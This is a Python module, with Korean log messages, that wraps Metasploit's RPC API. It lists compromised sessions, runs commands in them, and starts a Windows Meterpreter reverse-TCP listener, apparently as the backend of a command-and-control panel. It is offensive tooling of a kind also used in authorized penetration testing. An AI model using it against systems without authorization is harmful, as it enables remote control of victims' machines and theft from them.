import logging
from config import MSF_HOST, MSF_PORT, MSF_PASSWORD

logger = logging.getLogger(__name__)


class MsfClient:
    _instance = None

    def __init__(self):
        self.client = None
        self._connected = False

    @classmethod
    def get_instance(cls):
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance

    def connect(self):
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            self.client = MsfRpcClient(MSF_PASSWORD, host=MSF_HOST, port=MSF_PORT, ssl=True)
            self._connected = True
            logger.info("MSF-RPC 연결 성공")
            return True
        except Exception as e:
            logger.error(f"MSF-RPC 연결 실패: {e}")
            self._connected = False
            return False

    def reconnect(self):
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            self.client = MsfRpcClient(MSF_PASSWORD, host=MSF_HOST, port=MSF_PORT, ssl=True)
            self._connected = True
        except Exception as e:
            logger.error(f"재인증 실패: {e}")
            self._connected = False

    def get_sessions(self):
        if not self._connected:
            return {}
        try:
            sessions = self.client.sessions.list
            result = {}
            for sid, info in sessions.items():
                result[str(sid)] = {
                    "id": str(sid),
                    "ip": info.get("session_host", "unknown"),
                    "type": info.get("type", "unknown"),
                    "info": info.get("info", ""),
                    "platform": info.get("platform", ""),
                }
            return result
        except Exception as e:
            logger.error(f"세션 조회 실패: {e}")
            return {}

    def run_command(self, session_id, cmd, timeout=30):
        if not self._connected:
            return None
        try:
            session = self.client.sessions.session(str(session_id))
            result = session.run_with_output(cmd, timeout=timeout)
            return result
        except Exception as e:
            logger.error(f"명령 실행 실패 [{cmd}]: {e}")
            raise

    def kill_all_sessions(self):
        if not self._connected:
            return False
        try:
            sessions = self.client.sessions.list
            for sid in list(sessions.keys()):
                try:
                    self.client.sessions.kill(sid)
                except Exception:
                    pass
            return True
        except Exception as e:
            logger.error(f"Kill all 실패: {e}")
            return False

    def start_listener(self, lhost, lport):
        if not self._connected:
            return None, "MSF-RPC 연결 없음"
        try:
            exploit = self.client.modules.use('exploit', 'multi/handler')
            exploit['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
            exploit['LHOST'] = lhost
            exploit['LPORT'] = int(lport)
            exploit['ExitOnSession'] = False
            result = exploit.execute(payload='windows/meterpreter/reverse_tcp')
            job_id = result.get('job_id')
            if job_id is None:
                return None, f"핸들러 실행 실패: {result}"
            return job_id, None
        except Exception as e:
            logger.error(f"리스너 시작 실패: {e}")
            return None, str(e)

    def stop_listener(self, job_id):
        if not self._connected:
            return False, "MSF-RPC 연결 없음"
        try:
            self.client.jobs.stop(str(job_id))
            return True, None
        except Exception as e:
            logger.error(f"리스너 중지 실패: {e}")
            return False, str(e)

    def get_jobs(self):
        if not self._connected:
            return {}
        try:
            return self.client.jobs.list
        except Exception:
            return {}

    def is_connected(self):
        return self._connected
